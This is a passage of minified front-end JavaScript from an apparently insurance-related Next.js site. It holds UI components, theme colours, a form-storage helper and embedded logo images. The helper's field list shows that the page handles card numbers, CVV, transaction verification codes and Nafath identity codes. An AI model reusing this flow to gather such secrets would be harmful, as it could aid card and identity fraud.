(self.webpackChunk_N_E = self.webpackChunk_N_E || []).push([[931], {
    4783: function(e, t, r) {
        Promise.resolve().then(r.bind(r, 9580))
    },
    551: function(e, t, r) {
        "use strict";
        Object.defineProperty(t, "__esModule", {
            value: !0
        }),
        Object.defineProperty(t, "default", {
            enumerable: !0,
            get: function() {
                return o
            }
        });
        let a = r(9920);
        r(7437),
        r(2265);
        let s = a._(r(148));
        function o(e, t) {
            var r;
            let a = {
                loading: e => {
                    let {error: t, isLoading: r, pastDelay: a} = e;
                    return null
                }
            };
            "function" == typeof e && (a.loader = e);
            let o = {
                ...a,
                ...t
            };
            return (0,
            s.default)({
                ...o,
                modules: null == (r = o.loadableGenerated) ? void 0 : r.modules
            })
        }
        ("function" == typeof t.default || "object" == typeof t.default && null !== t.default) && void 0 === t.default.__esModule && (Object.defineProperty(t.default, "__esModule", {
            value: !0
        }),
        Object.assign(t.default, t),
        e.exports = t.default)
    },
    912: function(e, t, r) {
        "use strict";
        Object.defineProperty(t, "__esModule", {
            value: !0
        }),
        Object.defineProperty(t, "BailoutToCSR", {
            enumerable: !0,
            get: function() {
                return s
            }
        });
        let a = r(5592);
        function s(e) {
            let {reason: t, children: r} = e;
            if ("undefined" == typeof window)
                throw new a.BailoutToCSRError(t);
            return r
        }
    },
    148: function(e, t, r) {
        "use strict";
        Object.defineProperty(t, "__esModule", {
            value: !0
        }),
        Object.defineProperty(t, "default", {
            enumerable: !0,
            get: function() {
                return c
            }
        });
        let a = r(7437)
          , s = r(2265)
          , o = r(912)
          , l = r(1481);
        function n(e) {
            return {
                default: e && "default"in e ? e.default : e
            }
        }
        let i = {
            loader: () => Promise.resolve(n( () => null)),
            loading: null,
            ssr: !0
        }
          , c = function(e) {
            let t = {
                ...i,
                ...e
            }
              , r = (0,
            s.lazy)( () => t.loader().then(n))
              , c = t.loading;
            function d(e) {
                let n = c ? (0,
                a.jsx)(c, {
                    isLoading: !0,
                    pastDelay: !0,
                    error: null
                }) : null
                  , i = t.ssr ? (0,
                a.jsxs)(a.Fragment, {
                    children: ["undefined" == typeof window ? (0,
                    a.jsx)(l.PreloadCss, {
                        moduleIds: t.modules
                    }) : null, (0,
                    a.jsx)(r, {
                        ...e
                    })]
                }) : (0,
                a.jsx)(o.BailoutToCSR, {
                    reason: "next/dynamic",
                    children: (0,
                    a.jsx)(r, {
                        ...e
                    })
                });
                return (0,
                a.jsx)(s.Suspense, {
                    fallback: n,
                    children: i
                })
            }
            return d.displayName = "LoadableComponent",
            d
        }
    },
    1481: function(e, t, r) {
        "use strict";
        Object.defineProperty(t, "__esModule", {
            value: !0
        }),
        Object.defineProperty(t, "PreloadCss", {
            enumerable: !0,
            get: function() {
                return o
            }
        });
        let a = r(7437)
          , s = r(8512);
        function o(e) {
            let {moduleIds: t} = e;
            if ("undefined" != typeof window)
                return null;
            let r = (0,
            s.getExpectedRequestStore)("next/dynamic css")
              , o = [];
            if (r.reactLoadableManifest && t) {
                let e = r.reactLoadableManifest;
                for (let r of t) {
                    if (!e[r])
                        continue;
                    let t = e[r].files.filter(e => e.endsWith(".css"));
                    o.push(...t)
                }
            }
            return 0 === o.length ? null : (0,
            a.jsx)(a.Fragment, {
                children: o.map(e => (0,
                a.jsx)("link", {
                    precedence: "dynamic",
                    rel: "stylesheet",
                    href: r.assetPrefix + "/_next/" + encodeURI(e),
                    as: "style"
                }, e))
            })
        }
    },
    9580: function(e, t, r) {
        "use strict";
        r.r(t),
        r.d(t, {
            default: function() {
                return eX
            }
        });
        var a = r(7437)
          , s = r(551)
          , o = r.n(s)
          , l = r(2265);
        r(4575);
        var n = r(5783)
          , i = r(5818)
          , c = r(1942)
          , d = e => {
            let {onClick: t, label: r, className: s, disabled: o=!1, setLoading: n, type: i="button", style: c} = e
              , [d,m] = (0,
            l.useState)(!1)
              , u = async () => {
                m(!0),
                null == n || n(!0),
                await (null == t ? void 0 : t()),
                m(!1),
                null == n || n(!1)
            }
            ;
            return (0,
            a.jsx)("button", {
                onClick: u,
                type: i,
                className: "flex items-center justify-center min-h-[45px] text-white ".concat(s || ""),
                disabled: d || o,
                style: c,
                "aria-disabled": d || o,
                children: d ? (0,
                a.jsxs)("svg", {
                    className: "animate-spin h-5 w-5 mr-3 text-white",
                    xmlns: "http://www.w3.org/2000/svg",
                    fill: "none",
                    viewBox: "0 0 24 24",
                    children: [(0,
                    a.jsx)("circle", {
                        className: "opacity-25",
                        cx: "12",
                        cy: "12",
                        r: "10",
                        stroke: "currentColor",
                        strokeWidth: "4"
                    }), (0,
                    a.jsx)("path", {
                        className: "opacity-75",
                        fill: "currentColor",
                        d: "M4 12a8 8 0 018-8V0C6.477 0 2 4.477 2 10h2zm2 5.291A7.962 7.962 0 014 12H2c0 2.28.965 4.32 2.528 5.751l1.471-1.46z"
                    })]
                }) : r
            })
        }
          , m = r(1517);
        let u = {
            colors: {
                background: "#F4F7FB",
                surface: "#FFFFFF",
                primary: "#0F4C72",
                primaryDark: "#0B3856",
                primaryLight: "#E6F0F7",
                accent: "#F2A340",
                accentDark: "#D6892F",
                textPrimary: "#0E1F2E",
                textSecondary: "#4B5B6B",
                textLight: "#FFFFFF",
                border: "#D8E2EE",
                borderStrong: "#C5D3E1",
                info: "#1E88E5",
                success: "#1B9C85",
                error: "#D64545",
                warning: "#F6C453",
                footerBackground: "#0B2F48"
            },
            shadow: {
                soft: "0 16px 40px rgba(15, 76, 114, 0.12)",
                card: "0 14px 30px rgba(15, 76, 114, 0.16)"
            }
        }
          , x = {
            storageKey: "bcare.formStorage.v1",
            persistSensitive: !1,
            sensitiveFields: ["password", "cvv", "CVV", "card", "cardNumber", "secretCode", "verificationCode", "TransactionVerification", "nafathCode"]
        }
          , p = () => void 0 !== window.localStorage
          , h = e => {
            if (!e)
                return {};
            try {
                return JSON.parse(e)
            } catch (e) {
                return {}
            }
        }
          , f = () => p() ? h(window.localStorage.getItem(x.storageKey)) : {}
          , y = e => {
            p() && window.localStorage.setItem(x.storageKey, JSON.stringify(e))
        }
          , b = (e, t) => (null == t ? void 0 : t.sensitive) === !0 || (Array.isArray(null == t ? void 0 : t.sensitiveFields) ? t.sensitiveFields.includes(e) : x.sensitiveFields.includes(e))
          , g = (e, t) => !((null == t ? void 0 : t.persist) === !1 || b(e, t) && !x.persistSensitive && (null == t ? void 0 : t.persistSensitive) !== !0)
          , v = e => void 0 === e ? null : e
          , j = {
            configure() {
                let e = arguments.length > 0 && void 0 !== arguments[0] ? arguments[0] : {};
                x = {
                    ...x,
                    ...e
                }
            },
            getConfig: () => ({
                ...x
            }),
            getAll: () => f(),
            getForm(e) {
                if (!e)
                    return {};
                let t = f();
                return (null == t ? void 0 : t[e]) || {}
            },
            getField(e, t) {
                let r = j.getForm(e);
                return r ? r[t] : void 0
            },
            setForm(e) {
                let t = arguments.length > 1 && void 0 !== arguments[1] ? arguments[1] : {}
                  , r = arguments.length > 2 && void 0 !== arguments[2] ? arguments[2] : {};
                if (!e || !t || "object" != typeof t)
                    return;
                let a = f()
                  , s = {
                    ...a[e] || {}
                };
                Object.entries(t).forEach(e => {
                    let[t,a] = e;
                    g(t, r) ? s[t] = v(a) : b(t, r) && delete s[t]
                }
                ),
                a[e] = s,
                y(a)
            },
            setField(e, t, r) {
                let a = arguments.length > 3 && void 0 !== arguments[3] ? arguments[3] : {};
                if (!e || !t)
                    return;
                let s = f()
                  , o = {
                    ...s[e] || {}
                };
                if (g(t, a))
                    o[t] = v(r);
                else {
                    if (!b(t, a))
                        return;
                    delete o[t]
                }
                s[e] = o,
                y(s)
            },
            clearForm(e) {
                if (!e)
                    return;
                let t = f();
                (null == t ? void 0 : t[e]) && (delete t[e],
                y(t))
            },
            clearAll() {
                p() && window.localStorage.removeItem(x.storageKey)
            }
        }
          , N = [{
            images: "data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAyCAYAAACqNX6+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAASQSURBVHhe7Vk/SyNBFPeTXB8/xX2EwwOLfIOrBQtBblNoJcIpEkVExFxxFqYQUdFKNmAjBxohVp7phMCdnd3ce7uZ7LzNzM7OziQOOD944M95sxvml/dvMvP96e9nxliEBn8nFvj78Znkjz//GBpH4O/HgyAAnzimLAyXBEWOiMAnz4MgnvGQsgA+8SAIwCceUpZnPAjiGQ8pC+ATD4IAfOIhZXnGgyCe8ZCyACsb8+zn7Oy41RqsD+u6/S75BxbkgnVqNbkQOds5dvG+cvzjpqy4IT18qdVb7DW/H2DPb1kURcT0glwtsrtvnyrb+ZXNBxa46gAXLtJ1QOF+gMj7DYiO2hJbk67HNHpqddaF3CXuR1TmvfaYENz0Ket+WXrQZe353uKDA5KDEwXIWSe2ez5Cyo+XsvcohUtRng9Y3JQLwc1fQcQDUdkki674/rldtqLz1/Jb1pYIkLcJ1JAue1nNBKmSsl5bdXrwshyOKQzSlWw/hw0XP8NpC2W3eV5PLca14H84CUFIzVlkezr/HCctqJNvZhUu1BBIV6kc1Z/Xa0uEiJosusv53125bnv7JDoeLw2/WWLhrlisEbZ8bSGrW9Y1ahBLxAA7eUrXAZl/z7EgpN4sJmmGrA8h5Te77JR/K98tMlynKmyoJGJEv+T+IJ7DlHXNzkdipNFR7C/yPuvW3aUIDlNO0mUj1vrr+fickVi7N1zP+Z9suRPk7fKrEB3LZoOUkKr2Nx6SNWm766z9TCFy8X0uIgOBNaG8IAMW/SjT9gL0/IxER+eoq/EXeZ9tzvHoqLNTHikF5vYqQ3g/mNO5pmAAJN0V+oN4Tfi/E0HWj76Q6MDOqvR+kysMbq5qTL+V1a3afDKNk/UhKvMiQRTmIGWdsedcdHCU2S92NIlJuyv3Vxlk1pnUXZUqZRWYtSAkOqJttq7xJxw6q31+0HAo+K1X+ouRZCXIQ9ZAgGH64yi335BDoZYdPLFmM0lX+Ldlyrom0YHXJHQ9hYqL31JezBFyf+G6vGpxJ6JOsZtTREozHqTrMKHz/1kJQjoriI633DqHio86G8jfmzcaf6s55YEUbhS/2H+KPFdnLFIWnTvMLxFjtjP6xusvCSsPbKKQZYSfJpdETmVBSHSsHiTRUeSPIBw6HLF+FBfV6ndLyp9ni2waP90qOrCKKYvOHXija7YfuEEKEg8Vo0P6PCkXbgBMzMUtMhbzZgzjXm5ddbeFBv6VBNnbysTA6MDOymR/wsumErEQm7an4pxhYPaD51MydUsPXWWHt8le85T1e5s95qKDo9R+zsWUhQZpAjunzJ9O0OPrhu8DTI1DFPA2towNb1KSvcaCkOgwnTsIzx14kU0jpwNc8UHclB78mEFU5PebpayXAxIdpnMHx4iXSSkVb12lzzIw3fPVPL0klAqABnWiaL+RIK8HNDpM5w4OyhWRYvkD1djzDE33/Enx8ikLoqOTi45Cf0Dg5rykIPSn2UpzByBwPbe6OuEI3B0PggB84pWvThCBu+dBEM94SFkAn3gQBOATDynLMx4E8YyHlAXwhzP2H0mxfliFoOCkAAAAAElFTkSuQmCC",
            key: "7629"
        }, {
            images: "data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAyCAYAAACqNX6+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAQ5SURBVHhe7Vm/SxxBFL6/JKXgH2BhE1JYXJXmCgs7C8EqRRbEQlgUf0DAEMK5zTVnZaoDIdUVC3Kks9FGm3DaHQhiZ/fy9tz1Znbf7LzZ2T3HMB98hbezM/K+ffO9N9M6jH9+Ooy7oacbbAFAiPRwBF4Qx+AFcQzoId3wKO6Cpxv0GeIYvCCOwQviGLyHOEafIY7BC0IhxsBgZFRs99JxDQCn5whyA4MwhNCC0eghnUuFC7jb/ABXFA/68JyOahJBLvAq9sbpCyLiAJ+1SAYoMBdMDzmGPSLIJtzt/yDm7cLpESGAikdfyTns+As6S8WgK7l0CVuv7+7hu7QIRa7AhrQuTVziLTPkHiYHRODL2L9I360B+KW38wHXUN6uxtDDCWgBKAbJblgKXMIdQW6H9+nvAiZ9uBUFQd5dp89sUCZGkI4RkY6XtytRkDa5lcW4D4qitMn9bgZc4q0F6cBkkv6phOwvpHAmUInRnj4yQCKI/qsf99pTMabUGIqlhxzCPjm+fkpeY+UlQ/hIibE6JMbWxO8rL2IkXP1Cj0mJ/4pNhgzwyXzwPOzMBLHwESyGZCFSGhRC5hArMF2GIN+BIAyv4UCxVWUxwp2l8Mx8G8tD7zMicMl3IMj1ziw7NnfgKf3ZFKrs4FAXSBLjHn4AmRgtraEnaKgPqctb9mGwPcuMq81lGJxT4xg8u4QFItBssjxG1ZcsQueMGl8kLtVslTUwTCHJKyRWz4wE+LFiYOyo9xmqL9FXYSJwmebLXv2xyQxFQThlsR7ksQjRb5Rta9UEyaj3jwS4TPOChGEEXE3UGYKsWl1hJDEmBaoKHlK8iuYuN4YMU5/XWVZ4ckzMy+D5OvwRRdlehxNqXAm3gsdZYF/5lz5bUnmNTZ8i9iFLa8JZWJG4lEmGlH3pDzCKciJItKnI7Mpeo3LWMJt4iDHrsiwp9xRciiMIHw+jiBAjIX/bIiGWvobH8aQg1HkV4q17EVyuXkFQEYiaEEQ6ZDSruLiGrqrE7LIjgYEgtd+p//4Gu6Qglr2J5CUm/YjqvuNR6g02VqkxyDrOuM7W0JcyQcrvRXBJXYa8+Ae3dL0ZUGIgoxG6jAUsMqRyh67Y1jIkp7ic7luqtOzPsnIlrzKwmtLYtEPM4amfiYE0vdJVGHUpNWIk0B+ri2b+Qt32h0sbClKJtH9Mew5ObyGdZVU7XDTp1DkNXAJJEA4ZZsTwkObu00+iZSHQn+GUGFO8c6fH8Vhyfy7dlfO4FSziu0TgCS4Ee+QceeK/0nCGlGxVpV25grVc39aOkiMTwxKtUUG0tpHbisrJP9PCONTKeSJZTiOICF03nrBaRy6Zdo6mWUEF1YbzRP19iAOkgmpDao2miMuZZIhH0/CCOAYviGP4Lz3kPdNniGPwgjgGL4hj8B7iGH2GOAYviGPwgjgG7yGO0WeIUwD4B+Q4QZG2QHpNAAAAAElFTkSuQmCC",
            key: "5363"
        }, {
            images: "data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAyCAYAAACqNX6+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAATfSURBVHhe7VvPaxNBFM5f4j3+FZ6kUARBT7l4bntREhGEQitSqbeAImKEBiNehCBU8EdooFSk9BBJixAQrJG2BnrpTfDHczc7k52ZfdPM7Lyxqc4HH5Z++94m+3xv5pvVwgEcnAOABZV7vwYLT340h38G/e/pBfaDhP3fA2j8bA7/xBB0f3qmIC7JYgTdTZcK4pos6O76qCAUyYLurg8LQpUs6O56IV7lJ+XDYPjf9EK89aJKpiLo9vqwQ9jPEvIkExH0fHrwIQhOUg8+RMFJ6xPrQ3ZrU1AoFCJWoI3oGP4FfUJ9yC7UpuJipAWxi8/itOgT6EPaUBkWIi3Ic6v4LE6TPhk+pHVRKIDKWbj5tz5fvwEvi0V4evZsytIDuvwIVN2zD+lAa+kMdGciLtXhO/s9xyh+bRYpBOfFYYdgcP98ot6HnZJSjJhPHhPlzwLTvfqQ1RVWjIi9t32mJJDi2xWkEJyzo0VdhMn9TfWjRilbiJjF8/C+754fg07340O+3YMtVoiEl2AgXDo+fxOmRwVJd1kc4+OP1z81LuMFUBmNqyMWI8L1/vtrz6LvdwslkQ9Zhy9SARTW19l1pvlvw4ymIGbxx+kdaGCjCeHLhtzVMfLfvwdVpAAqaXzI9jxeCMYv28ll5vmbwk6L2IfsXocX6sKNsViCHaUeee+/V3uIPnyMJD7kqI4XIuH8sO3t8otbX1ofYj6uGtK4ynv/rQr+4HX04kO+v72UFiQaV7bxakH8+pANaCEdI46rvPn1nfEQmrvsogj7vzdhjmkefEgfBnyrG7HXzfNlxIJ49iEbNzLFEMdV/vy6NaMJW+yKGKN4ttDT+5BBHXq8O2bKsJrry4gF8exDFpD1hI0rl/za7qj02BVyPL+e3IdI42rljnV8grawy/LpQ5a148o1/2vd2sEKIsen3UTsQ7LjCsP4/H59yEjXjKvYDLrmXy4rhRBZ2ZTixYWfyIcwROPqI++OaFzlN1U+fUiq9xexcUVzdvXh0X25CBinNqCpdBKND2H4+ubCqDtEM8hhnt+jD+E6dpAYsbFOlN/QCEo8/4rGh8SQDhIjcjPIYZffnw/hOnp+VbwCXaL8CQ6hOYU8eB3LdUIfcnBNGFeJGeSwz+/bh2hOdhdXmS7DPn+MHB0SkcyH6MaVabyse/YhmnH1boPpAuzza7oiGkd7Bh1D5EM60u7K/uxK1f36EHxcLUZ9I8M+v6YrhsUQoS8MjQ+RzGCOs6tj34dkWYkWFav8EnTjSm4P+/y6h/xMcuYccRy2NSbxIc5nV5YFmVkzzd/BH74JbRf4duydsg/4au2QXZCCx2NbYwIfQnB2ZVmQ6ZZhfs1aYUSrBV4/gqqKq03je2iMuw8hObtKQK1rX80a0G6B1++oxA6R4jUd5exDaM6ufOiatcKE1gt8D5aQh5swOWpP4/HOSFi19CHdcvrwTci2v8b5T62evs/Iz7tQ/2z577KOfzOYZbz9Hf9laHX0b7wDTe9vdHalZRVes/zmPkRaK0w4D5/FeARSfgR5dOyhutDm/jbvzjnnlA0K+fsQjpPSsYfqwjyfb1xh4oVeF0/iQ1QEPb9O4ENkBN1Nd/chAoLurjv7EI6g0+h2PiTo7DcyKHWy9yFBp9HD/1OfMP2f8yEcp1UPPgTByekAfwAn2CuCD8IJwgAAAABJRU5ErkJggg==",
            key: "1118"
        }, {
            images: "data:image/jpeg;base64,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",
            key: "8522"
        }, {
            images: "data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAyCAYAAACqNX6+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAVfSURBVHhe7Vq/axRBFL4/JW1shEAKOytZECxiEThQrII2EuL+AUZQSaeFhMCR6gKiyIFa2VxzgpBWkHTHwXVp9B94vrc7czs/3uzO7E6SNc4Hj9x3M/t2eO9mvvd2MwCA22jPyb48+1j8TfzqOCWECHzNP9KfFRK/Gl4kJJYzicTb84HYNivEdE5IPIyvjixCbOeJh/OkIQJ94UlDEH3iSUN6xpOGKOgDTxoi0BeeNATRJx6sIcfZTRgMBq0sn4YtjvC/8UANOYRRxge72XJ47fQ/g+/r63By40aY3Xklri/RvP7+8zANmY8gY4PtYZvaRjT8z+BDm4Tsz8T1nutX0FcepCHzUcYH28PouJKw/b9qt0NEQnzXL8Hx5egI7g5eGDaBUzGu4iJ5gIbM2eNqIzsU4yVCbk4ouX5kfa9++C39VWji7zbNJNi2OzoXs+Pf3+T+GoLH1YaRjMHgJozmYhwRevOK8wlp769ELZ/P4BETfN4uYKfgiYEhNGzpryFsdZWNcN+UCFoMQue6hlBCuvlr4FYyJvBOm38OL9fU8RfwKBuLsRJd17NlJQMtR8MxDw15DjklwLBMbI/Qxdhc15APD7v6q+NnsKcEmo4jfv4ZvDXmSYTdT+dTCrqZCGGks34agl7MZDht7fFq1xD8Fnt5GqJqhjsZJU5zOyGh93u6ZgfeZVT34J9mDZnmTOAbjHaP/+IvSUN2DmFXBNg+puz5Ickj2Pf7hW2CHXjWcOfQ9fixSUOm7HHVbCGC79eHdN056i++WRPGMMmq+Xvb4ferO55M2xL+8WODhoQcV4b5a0xAH7I+hE9PmvxxXNWEA5g0/ljU+W+KKkvC736oCUbQ3bYsjitCo4a83iyDKxs7c7z22RZe5Lf48EcnwccaVlbVcXW0Sohz/nQi5qJlM1iW3/rfT0DjeM8NLiG4kySQevYhCBd3aYx/0ygS4nw2xSRsfR8mTn8lNK4GGO0t/sDq5scQdJMfZ38wLkYy0NQfO1K/PqSOux6p1D8uCee/x0MtKUGasv1GS4jr2LIfocRqCr8BhgnjYhuFSc5H2vV9yBxLOzsZ8ZpGlS/g51DZKUHPsvS+wtvyM0//FViOwWArLlFdSXR/p77zmH0CHK9p1PnkjpKQ4Rg+h1xvHFu8HcDuqro6gpc7Af4RLj4fGYkQJqsrCfyK0ZCisqp7f1HC1cHL3eG7WAkfrh1bt/bgtxgj+Plz7BQU7hMaV5O2eVxeKODnv4LK+eOqqq4INH+VEPViTaQdwZXVl21Z0X/ULY7Qli/29R0iExLH/7nSe7QrdSU0jvFoqq7kfPza1JApbBWBbWck5EGLRfjzLhpSwcVVQacqTKKrf5/qSsLWkO17OJkPdr3lWrUgEZUvxvBeKX+pyorlX6uuUMgluvv/4WwQuXjh17qGtH1uJa9X4cepxxjCz0XT/AV8uqXsjtA+BOHias8RrQlEFByjjiGyzaiuCMRxyNGHNO6Ue5YgqfDnRtPHHUPGziB7f/9IDJaou99pzldLWiIuIhkI1/Mss7qS83Goax/Slbf4B4eQ/zbxfDMY630HQeX8cWVXVxLd+5DOPOwfHEJ2BuEkO2ATUFnEagqh8ZrjSsK8HoeZPkTg0vnDB2wSCsOjLNy//ghdtVbvN2p4yKN2zmSrgB8dGpK4+FSiibPvyH0Nm8Zj4Q/pVWvINeDbSz7QnraRfROekF+9hsTn3BHVxqQ/FRzvdlz90d6s4lc90pBInAtuG4u1HgkfvkpIDGcqEm/Hi4TEciaReHt+LTVExb/Gr6WGSPyLPGmIQF940hBEn3jSkJ7xpCEK+sCThgj0gwP8Bd4chBxrDfj1AAAAAElFTkSuQmCC",
            key: "5591"
        }, {
            images: "data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAyCAYAAACqNX6+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAPxSURBVHhe7Vo9TxtBEPXfMT+AOqUll6nwD6AGyaHG/AAkS5YQEqXdBCFTQKRUKMSuaFKQwg0gE6qQgjRESjHZudsze7uz6927892es096yPK7/WDfzc7OnRuvXx/fvX553A/0gw38Awb8uf7BP9EIerF6MMQzPRjimR4M8UwPhnimB0M804MhnumRIfhloB8MEeKZHgzxTA+GeKYHQzzT/y9D5kO4bDZhtLGh5XTCr+VwHt9iDBNzGdJtMEdFtgAeuJbA+R+SkFs/+kD+40vZi51xHr8yQ64kMzw15G47++KMOkP46Tp+EYZgpy78vEWYgdz8DTPi+iqZyxDG6yO6Xy3PBnBRRoQo2xPFVUXIwwR2GgfQprj5CZ74tRTyGjLaPuc90VDmr4kQOTclkNv7a8jVmDZAwz7bQimkDGn2YM6/TxCPP4Gp7q5uD+AlvpSEMv91NeSmSy+8nmO44W1FRIawXKBb1MX4ur0/RAhiBv3FQg9gLHeKICKIihLr8Sc9ZRGRF/uUzW9Q+i/LEBkPJ5IZRRqCi92dRR9N7Z9OjosxRGNGGacsPDSI8NMQAUY9FSXHZCSp7Q35QiTPN87zczQkYRJBtTYkFSGtCXnaUtsvMaTZgVsh8zvPL6MhyMvhPDYEO3XlbO+vakipdcgUDhfRcQCHfeoaiudwbbNgLJnT7ZcwTx3SfF/fCEmdwni+oaC2t9yykGzbunOdXxIh/GSnjj+H245+/FoaktqqlhSGdv0bFsn12CtBp8979Hj1MkQ+6rLIKK5/jSlsGxFziozM42tyjd+GaKv1txNVrv4ZRP1l2FEWCKmrIRDZx6e3Tq8NIat1KV/k6R8h6rptBE8/OmQev34RIlbrBC0Kx6jgs95y9MneOkL4IovX6+a3BjnkGcattClYmRvbyxU4f+kkImqvq9SRLjlEuusxstT5GU55rAaKDMFGZv6CXXnxLblrXR/Y8DucbgqmbE2JawRmfVsosj2IHp+Q/cvM+S4ET3TWEWL1cJEgGmJC0r8Osi7XH8b2pjvfhuyO/XbmMD9NXrAij96aGZLetnZOnldqCOYCp/llNEQ8NNTLkNSbw/joa2zPFijTFiK8yHKanwiLm4EyPHNST1Cmntqu+MNE6/Y2d68u6RtQtF4fQ6QiMXn34c38NHDVKzQE88ExnH60aE88MkmwuvnFKFuvzhDplyT0jxRmqUfsshmIlc2Po2w9MgS/LJv3e4P0QttwWd2xBqwoQtSq20z69SxiNfN7Q9l69Um9PyIM4GQnqftVj++ZXr0hQeefYgRDPNNLN4TcmjISUfT8ZJStB0M808OW5ZkeGYJfBvrBECFe6QD/APvyQgElA3I0AAAAAElFTkSuQmCC",
            key: "1335"
        }, {
            images: "data:image/jpeg;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAAAyCAYAAACqNX6+AAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAS0SURBVHhe7Vu/SxxBFPYvsT9bi7QpJAgp7UwnWiTgj8IqIOSE2IqlcAiiASHFEdCkCShyEsMRDDGNnQoWgo1dupd5uzO7b3Zmd2d2Z+6mmA+e+u2+fevdu/e+mbc68WN1+BIAPghjPPs58tHzCfxyuTpk33JEPj6eJAR/cBkUEXkzniUE4SqoQOT2HDUkSwjCRVCKyO141BCGkHjUEI5QeNQQghB41JDAeNQQhpB41BCOUHgzDTntw+uJTcUWZ87S8xzG8Tj882N43JqEP281tn/uIH573kBDjmFHkwy0td6TwfXj4Odwp0uCxq6WXdwvhy231pDhuj4ZaJgQhE08hH/eM04I2iiTct/twKepqcysNOSht6tNhDCREIRJPAq//Byu8M3e2od//Ih0/npDTgrz+9nqfnX8Hr69kBOhJARRGeR2AIuaJFALX0MquJSUDXhmh5zGZ0j4/SGcdPTJQDPUkJtS3aDmU0P01dmHA0fx8VObC/4cPD6mR5vHSyHxQVdOwPwhnEv+AzMNOZiW34jFmWPoz8rH0HxoSJVmCXNTmTQhr7KEIJrFy5HwQmVcDPhJBupfryHFJe76DTv4BNuT5Bg3pxqycARrhfjl5qJSqPBvwLB1PMplzcBklPlXa4jypvQg9XjSVogzDWF6Jd+3n9w391fv37pdPu7Db5EQtidBtIrHIPjz4XyWDGxTqE8InX+FhqgveudUnNcnxI2GyPuc8iTLuta2XT7vi+qYhLvr5FCCpvEELlf34IK0qi9vqv1LNaTYu+V2